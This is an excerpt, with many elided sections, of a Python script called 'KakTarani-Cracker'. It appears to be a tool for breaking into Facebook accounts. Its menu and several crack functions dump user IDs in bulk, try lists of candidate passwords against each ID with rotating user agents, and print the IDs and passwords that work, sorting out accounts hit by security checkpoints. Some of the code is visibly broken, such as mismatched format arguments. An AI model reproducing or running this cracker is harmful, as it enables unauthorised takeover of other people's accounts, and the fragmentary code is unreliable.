...
yso = 'KakTarani-Cracker'
pss=input("\033[1;31m Key :")
if pss ==yso:
 pass
...
def menu(my_name,my_id):
	...
	#cetak(nel('\t [white](%s)[green]'%(my_name)))
	#alvino_xy(f'SIIIX['+str(my_id))
	#alvino_xy(f'SIIIX[{ip}')
	print('[1] CRACK PUPLICK')
	
	print('[2] CRACK FILE')
	_____KakTarani__KakTarani_____ = input('\n CHOUS ')
	if _____KakTarani__KakTarani_____ in ['1']:
		dump_massal()
	elif _____KakTarani__KakTarani_____ in ['']:
		error()
	elif _____KakTarani__KakTarani_____ in ['2']:
		crack_file()
	elif _____KakTarani__KakTarani_____ in ['']:
		result()
	elif _____KakTarani__KakTarani_____ in ['']:
		...
		print('_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[')
		exit()
	else:
		print('______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[')
		back()
def error():
	print(f'{k} {x}')
	time.sleep(4)
...
def lah():
	print("\r"+balmond+m+" \x1b[1;86m :\x1b[1;87m "+str(len(id))+"                     ")
	input(balmond+m +"\x1b[1;86m Klik [\x1b[1;85m Enter ]\x1b[1;83m Jika Ingin Langsung Crack !!")
	pass
	setting()
def grup():
	print('')
	...
	print(""+balmond+p+" \x1b[1;81m>> p :\x1b[1;82m "+berr2)
...
def passwrd():
	...
	print('')
	#print(f'{h}[SHERA]{x} {h}OK/%s {x}'%(okc))
	#print(f'{k}__________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________[SHERA]{x} {k}CP/%s {x}'%(cpc))
	print(f'{m}{x}\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ KakTarani ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r  {K} NOO {idf}|{pw}{N}')     
				os.popen('KakTarani CP')
...
def crackfree(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			if "KakTarani checkpoint" in po.cookies.get_dict().keys():
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\rKakTarani¬¬ OK:%s ¬ CP:%s  %s%s%s '%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					print('\n')
					statuscp = f'[YAA] ID       : {idf} [KakTarani] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='KakTarani CP'))
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[KakTarani ok] ID       : {idf}\n[KakTarani ok] PASSWORD : {pw}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='KakTarani OK'))
					ok+=1
					break
					...
					print('\n')
					statusok = f'[bold green][KakTarani ok] ID       : {idf}\n[KakTarani ok] PASSWORD : {pw}\n[KakTarani ok][/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]KakTarani OK[/bold green]'))
					ok+=1
					break
...
def crackmbasic(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s KakTarani %s/%s KakTarani OK:%s KakTarani CP:%s KakTarani %s%s%s KakTarani'%(bi,loop,len(id2),    ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
